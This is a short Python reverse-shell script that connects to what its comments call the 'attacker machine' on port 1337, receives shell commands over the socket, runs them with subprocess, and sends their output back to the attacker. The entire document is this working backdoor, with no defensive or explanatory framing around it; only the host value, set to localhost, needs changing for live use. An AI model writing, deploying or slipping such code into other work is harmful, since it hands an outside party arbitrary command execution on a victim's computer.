import socket,subprocess
HOST = "localhost"    # The remote host
PORT = 1337            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
